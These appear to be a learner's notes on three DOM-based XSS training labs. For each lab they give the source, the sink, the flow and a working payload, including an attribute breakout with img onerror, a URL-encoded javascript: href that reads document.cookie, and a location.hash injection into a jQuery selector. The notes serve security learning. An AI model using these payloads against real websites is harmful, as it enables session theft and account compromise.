# Tuesday XSS — 3 Labs

## 1. DOM XSS — `document.write()` + `location.search`

**Source:** `location.search`
**Sink:** `document.write()`

Flow:
`location.search → query → document.write()`

Context: input was placed inside an existing `<img src="...">` attribute.

Payload:

```html
"><img src=x onerror=alert(1)>
```

**Lesson:** Break out of the attribute, create an element, and use `onerror` for JavaScript execution.

---

## 2. DOM XSS — jQuery `href` + `location.search`

**Source:** `location.search`
**Sink:** jQuery `.attr("href", ...)`

Flow:
`returnPath → URLSearchParams → href → Back link → JavaScript`

Payload:

```text
javascript%3Aalert(document.cookie)
```

`%3A` → `:`

**Lesson:** User-controlled input became the `href`. URL encoding allowed the `javascript:` scheme to survive parameter decoding.

---

## 3. DOM XSS — jQuery selector + `location.hash`

**Source:** `location.hash`
**Sink:** jQuery `$()` selector

Flow:
`location.hash → slice(1) → decodeURIComponent() → $() → HTML injection`

Payload:

```text
#%27%3E%3Cimg%20src=x%20onerror=print()%3E%27
```

Decoded:

```html
'><img src=x onerror=print()>'
```

The exploit required a `hashchange` event, so the exploit server first loaded the page and then changed the hash.

**Lesson:** Always identify the source, transformations, sink, and required event.
